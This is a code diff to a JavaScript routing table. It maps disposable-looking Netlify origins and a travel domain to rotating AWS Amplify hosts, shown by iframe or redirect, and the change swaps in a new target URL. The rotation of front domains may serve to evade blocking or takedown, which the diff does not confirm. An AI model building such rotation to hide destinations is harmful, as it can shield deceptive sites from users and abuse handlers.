@@ -109,8 +109,8 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://mellifluous-cupcake-c29008.netlify.app": { method: "iframe", target: "https://main.du3h92x09wdy1.amplifyapp.com" },
-    "https://polite-cat-d0b08d.netlify.app": { method: "iframe", target: "https://main.du3h92x09wdy1.amplifyapp.com" },
+    "https://mellifluous-cupcake-c29008.netlify.app": { method: "iframe", target: "https://main.d1tcxu1o1rgsyj.amplifyapp.com" },
+    "https://polite-cat-d0b08d.netlify.app": { method: "iframe", target: "https://main.d1tcxu1o1rgsyj.amplifyapp.com" },
     // "https://heroic-unicorn-b2bbb8.netlify.app": { method: "iframe", target: "https://main.d17fmf0xga5yvy.amplifyapp.com" },
     // "https://singular-fairy-efaa38.netlify.app": { method: "iframe", target: "https://main.d17fmf0xga5yvy.amplifyapp.com" },
     "https://hiroakitravels.com": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
